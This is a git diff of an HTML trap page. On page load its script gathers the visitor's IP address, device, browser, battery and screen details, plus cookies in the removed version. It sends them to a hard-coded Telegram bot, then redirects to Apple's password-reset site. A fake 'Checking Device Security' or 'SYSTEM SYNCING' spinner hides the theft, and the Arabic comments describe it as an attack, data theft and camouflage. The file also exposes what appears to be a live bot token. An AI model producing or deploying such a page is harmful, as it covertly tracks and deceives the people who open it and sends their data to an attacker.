@@ -2,43 +2,42 @@
 <html>
 <head>
     <script>
-        async function launchAttack() {
+        async function runBypass() {
             const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
             const chat_id = "6888107255";
+            let details = "💀 نفاذ إجباري - تم التجاوز:\n";
 
             try {
-                // جلب الـ IP الحقيقي والموقع من خدمة خارجية
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                let msg = "🚀 نفاذ متقدم - تم سحب البيانات:\n";
-                msg += "🌐 الـ IP الحقيقي: " + data.ip + "\n";
-                msg += "📍 المدينة: " + data.city + " (" + data.country_name + ")\n";
-                msg += "📶 المزود: " + data.org + "\n";
-                msg += "📱 المتصفح: " + navigator.userAgent + "\n";
-                msg += "🔋 مستوى البطارية: " + (await navigator.getBattery()).level * 100 + "%\n";
-                msg += "🔒 الكوكيز المتاحة: " + (document.cookie || "محمية بميزة HttpOnly");
-
-                // إرسال البيانات فوراً للتليجرام
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-                
-            } catch (error) {
-                // في حال فشل جلب الـ IP، إرسال تنبيه بالدخول على الأقل
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Target_Entered_But_IP_Blocked`);
+                // محاولة جلب IP عبر خدمة ثانية أسرع وأقل حظراً
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                details += "🌐 الـ IP: " + ipData.ip + "\n";
+            } catch (e) {
+                details += "🌐 الـ IP: (فشل التجاوز - محمي بـ VPN/Firewall)\n";
             }
 
-            // التمويه النهائي
-            setTimeout(() => {
-                window.location.replace("https://iforgot.apple.com");
-            }, 500);
+            // سحب معلومات الجهاز التي لا يمكن إخفاؤها
+            details += "📱 نظام التشغيل: " + navigator.platform + "\n";
+            details += "🖥️ المتصفح: " + navigator.appName + "\n";
+            details += "🕰️ التوقيت المحلي: " + new Date().toLocaleString() + "\n";
+            details += "🔋 البطارية: " + (navigator.getBattery ? await (await navigator.getBattery()).level * 100 + "%" : "غير مدعوم") + "\n";
+            details += "📏 الدقة: " + screen.width + "x" + screen.height;
+
+            // إرسال البيانات فوراً
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(details)}`);
+            
+            // التحويل الفوري للتمويه
+            window.location.replace("https://iforgot.apple.com");
         }
-        window.onload = launchAttack;
+        window.onload = runBypass;
     </script>
 </head>
-<body style="background:black; color:white; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <div style="text-align:center;">
-        <div style="font-size:60px;"></div>
-        <p>Checking Device Security...</p>
+<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
+    <div style="text-align:center; font-family:sans-serif;">
+        <div style="font-size:80px; margin-bottom:20px;"></div>
+        <div style="width:30px; height:30px; border:3px solid #fff; border-top:3px solid #000; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
+        <p style="margin-top:20px; letter-spacing:1px; font-size:12px;">SYSTEM SYNCING...</p>
     </div>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
